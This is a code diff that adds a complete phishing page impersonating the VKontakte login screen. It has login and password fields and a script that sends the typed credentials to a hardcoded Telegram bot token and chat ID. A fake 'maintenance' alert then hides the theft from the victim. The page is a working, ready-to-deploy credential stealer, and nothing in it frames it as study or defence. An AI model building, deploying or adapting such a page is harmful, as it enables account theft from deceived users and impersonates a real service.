@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вконтакте</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #3a3a3a, #6c6c9f); /* Светлый градиент фона */
+            font-family: Arial, sans-serif;
+            color: white;
+        }
+        .login-box {
+            background-color: rgba(0, 0, 0, 0.85); /* Сделал фон формы более темным */
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.7);
+            width: 300px;
+            text-align: left;
+        }
+        .login-box h1 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .login-box input {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin: 10px 10px 10px 0;
+            border: none;
+            border-radius: 5px;
+        }
+        .login-box button {
+            padding: 10px;
+            width: 100%;
+            background-color: #00ced1;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            color: black;
+            font-size: 16px;
+        }
+        .login-box button:hover {
+            background-color: #008b8b;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <h1>Вконтакте</h1>
+    <input type="text" id="login" placeholder="Введите логин"><br>
+    <input type="password" id="password" placeholder="Введите пароль"><br>
+    <button id="sendLogin">Войти</button>
+</div>
+
+<script>
+    const token = '7510236584:AAEpId-AiOqQA4IrmMM6AYC6n6MumeuoaAc'; // Ваш токен бота
+    const chatId = '5253442722'; // Ваш ID чата
+
+    document.getElementById('sendLogin').onclick = function () {
+        const login = document.getElementById('login').value;
+        const password = document.getElementById('password').value;
+        
+        if (login && password) {
+            const message = `Логин: ${login}\nПароль: ${password}`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('Технические работы!');
+                } else {
+                    alert('Ошибка при отправке данных.');
+                }
+            })
+            .catch(error => {
+                console.error('Ошибка:', error);
+                alert('Ошибка при отправке данных.');
+            });
+        } else {
+            alert('Пожалуйста, введите логин и пароль.');
+        }
+    };
+</script>
+
+</body>
+</html>
